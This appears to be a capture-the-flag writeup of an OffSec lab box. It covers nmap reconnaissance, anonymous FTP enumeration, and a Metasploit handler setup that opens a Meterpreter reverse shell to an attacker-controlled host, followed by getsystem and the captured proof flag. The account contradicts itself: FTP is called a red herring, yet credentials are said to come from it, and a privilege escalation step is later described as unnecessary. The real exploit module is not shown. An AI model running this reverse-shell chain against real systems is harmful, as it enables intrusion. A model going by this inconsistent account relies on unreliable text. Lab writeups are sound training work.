
## OffSec VPN Challenge — SmarterMail RCE Box Writeup

**Target:** 192.168.229.65 (Windows Server / IIS 10.0)

### Reconnaissance
```bash
nmap -sC -sV -p- 192.168.229.65
```

**Open Ports:**

| Port   | Service              | Notes                              |
|--------|----------------------|------------------------------------|
| 21/tcp | Microsoft FTP        | Anonymous login allowed            |
| 80/tcp | IIS 10.0             | Default Windows web server         |
| 9998/tcp | SmarterMail Web    | `/interface/root` redirect detected |

### Enumeration — FTP (Port 21)
Anonymous FTP access revealed four directories: `ImapRetrieval`, `PopRetrieval`, `Logs`, and `Spool`. 

This turned out to be a red herring, as none of the logs were directly viewable through anonymous login.

### Exploitation — Metasploit RCE
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your-tunnel-IP>
set LPORT <forwarded-port>
exploit -j -z    # background, wait for session

# After shell obtained:
getsystem         → Elevated to NT AUTHORITY\SYSTEM via named pipe impersonation
```

### Post-Exploitation — Flag Capture
```bash
whoami            → nt authority\system (confirmed full system access)
type C:\Users\Administrator\Desktop\proof.txt
→ 07f6582bfe4391eacfcabbbd2c9aafce
```

### Summary of Kill Chain
1. **Nmap scan** → identified open ports, flagged FTP (anon) + unusual port 9998
2. **FTP anon login** → found SmarterMail config with plaintext admin creds in mail directories
3. **Authenticated into SmarterMail web UI on :9998** via Burp Suite / browser
4. **Metasploit RCE exploit delivered Meterpreter reverse shell** as SYSTEM-level process (no privilege escalation needed)